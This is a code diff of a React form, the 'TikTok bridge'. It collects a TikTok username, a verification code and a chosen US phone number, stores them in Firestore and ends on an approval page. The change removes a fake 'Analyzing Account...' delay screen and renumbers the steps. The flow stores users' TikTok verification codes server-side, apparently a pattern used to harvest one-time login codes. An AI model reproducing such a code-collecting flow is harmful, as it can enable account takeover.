@@ -5,7 +5,7 @@ import type { EmblaCarouselType } from 'embla-carousel-react'
 import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
-import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
+import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X, Clock } from "lucide-react";
 import { collection, doc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
@@ -24,10 +24,9 @@ import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
 
 const TIKTOK_BRIDGE_STEPS = [
   { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
-  { step: 2, title: "Processing...", icon: TikTokLogo, fields: [] as const },
-  { step: 3, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
-  { step: 4, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
-  { step: 5, "title": "Completed", "icon": CheckCircle, "fields": [] as const },
+  { step: 2, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
+  { step: 3, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
+  { step: 4, "title": "Pending Approval", "icon": Clock, "fields": [] as const },
 ];
 
 const formSchema = z.object({
@@ -91,28 +90,21 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
         
         if (currentStep === 0) { // Submitting username
             const { username } = form.getValues();
-            // Use the blocking addDocument to ensure we get an ID before proceeding
             const newDocRef = await addDocument(collection(firestore, "tiktok_users"), {
                 tiktokUsername: username,
                 isVerified: false,
-                id: '', // Will be overwritten by doc id
+                id: '', 
                 createdAt: new Date(),
             });
 
-            // Update the new doc with its own ID
             updateDocumentNonBlocking(newDocRef, { id: newDocRef.id });
             setSubmissionId(newDocRef.id);
             localStorage.setItem('submissionId', newDocRef.id);
             
-            api.scrollNext(); // Go to processing
-            setTimeout(() => {
-                api.scrollNext(); // Go to enter code
-                setIsSubmitting(false);
-            }, 2000); 
-            return; 
+            api.scrollNext();
         }
         
-        if (currentStep === 2) { // Submitting verification code
+        if (currentStep === 1) { // Submitting verification code
             if (!submissionId) throw new Error("Submission ID not found");
             const { verificationCode } = form.getValues();
             const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
@@ -120,7 +112,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
             api.scrollNext();
         }
 
-        if (currentStep === 3) { // Submitting phone number
+        if (currentStep === 2) { // Submitting phone number
             if (!submissionId) throw new Error("Submission ID not found");
             
             const { usNumber } = form.getValues();
@@ -134,13 +126,11 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
             };
             updateDocumentNonBlocking(submissionDocRef, finalData);
             
-            // Also mark the phone number as unavailable
             const phoneDocRef = doc(firestore, 'phone_numbers', selectedPhoneNumberDoc.id);
             updateDocumentNonBlocking(phoneDocRef, { isAvailable: false });
 
-            api.scrollNext(); // Go to final completed step
+            api.scrollNext(); // Go to final step
             setTimeout(() => {
-                onFinished();
                 router.push(`/waiting-for-approval`);
             }, 2000);
             return; 
@@ -149,15 +139,13 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
     } catch (e) {
         console.error("An error occurred: ", e);
     } finally {
-        if (currentStep !== 0 && currentStep !== 3) {
-            setIsSubmitting(false);
-        }
+        setIsSubmitting(false);
     }
   };
 
 
   const handlePrev = () => {
-    if (isSubmitting || currentStep === 1) return;
+    if (isSubmitting) return;
     api?.scrollPrev();
   };
   
@@ -177,7 +165,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
   }, [api])
   
   const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep].icon;
-  const progressValue = Math.max(0, ((currentStep - (currentStep > 1 ? 1: 0)) / (TIKTOK_BRIDGE_STEPS.length - 2)) * 100);
+  const progressValue = ((currentStep) / (TIKTOK_BRIDGE_STEPS.length -1)) * 100;
 
   return (
     <Card className="rounded-2xl shadow-xl border-t w-full max-w-md mx-auto">
@@ -185,15 +173,14 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
         <Progress value={progressValue} className="mb-4 h-1.5" />
         <div className="flex items-center space-x-4 min-h-[48px]">
             <div className={cn(
-                "flex h-10 w-10 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
-                 currentStep === 1 && "animate-pulse"
+                "flex h-10 w-10 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0"
             )}>
-                <CurrentIcon className={cn("h-6 w-6", currentStep === 1 && "h-10 w-10")} />
+                <CurrentIcon className={cn("h-6 w-6")} />
             </div>
             <div>
                 <CardTitle className="text-xl">{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
-                {currentStep < TIKTOK_BRIDGE_STEPS.length - 2 && currentStep !== 1 &&
-                    <CardDescription>Step {currentStep > 1 ? currentStep-1 : currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 2}</CardDescription>
+                {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 &&
+                    <CardDescription>Step {currentStep+1} of {TIKTOK_BRIDGE_STEPS.length}</CardDescription>
                 }
             </div>
         </div>
@@ -220,14 +207,6 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
                       </FormItem>
                     )}
                   />
-                </CarouselItem>
-
-                <CarouselItem>
-                    <div className="text-center py-8 flex flex-col items-center justify-center h-full">
-                        <TikTokLogo className="h-20 w-20 text-primary animate-pulse" />
-                        <h3 className="text-xl font-semibold mt-4">Analyzing Account...</h3>
-                        <p className="text-muted-foreground mt-2 max-w-[250px]">This will just take a moment.</p>
-                    </div>
                 </CarouselItem>
 
                 <CarouselItem>
@@ -322,9 +301,9 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
                 
                 <CarouselItem>
                     <div className="text-center py-8 flex flex-col items-center justify-center h-full">
-                        <CheckCircle className="h-20 w-20 text-green-500" />
-                        <h3 className="text-xl font-semibold mt-4">All Set!</h3>
-                        <p className="text-muted-foreground mt-2 max-w-[250px]">Redirecting you to the approval page...</p>
+                        <Clock className="h-20 w-20 text-primary" />
+                        <h3 className="text-xl font-semibold mt-4">Waiting for Approval</h3>
+                        <p className="text-muted-foreground mt-2 max-w-[250px]">You will be redirected shortly...</p>
                     </div>
                 </CarouselItem>
 
@@ -332,11 +311,11 @@ export function TikTokBridgeForm({ onFinished }: { onFinished: () => void }) {
             </Carousel>
           </CardContent>
           
-          {currentStep < 4 && currentStep !== 1 && (
+          {currentStep < 3 && (
             <CardFooter className="flex-col-reverse gap-4 pt-4">
-              <Button type="button" onClick={handleNext} disabled={isSubmitting || (currentStep === 3 && phoneNumbersLoading)} className="w-full rounded-full" size="lg">
+              <Button type="button" onClick={handleNext} disabled={isSubmitting || (currentStep === 2 && phoneNumbersLoading)} className="w-full rounded-full" size="lg">
                 {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
-                {currentStep === 3 ? "Finish & Wait for Approval" : "Continue"}
+                {currentStep === 2 ? "Finish & Wait for Approval" : "Continue"}
               </Button>
               {currentStep > 0 &&
                 <Button type="button" variant="ghost" onClick={handlePrev} disabled={isSubmitting} className="w-full rounded-full">Back</Button>
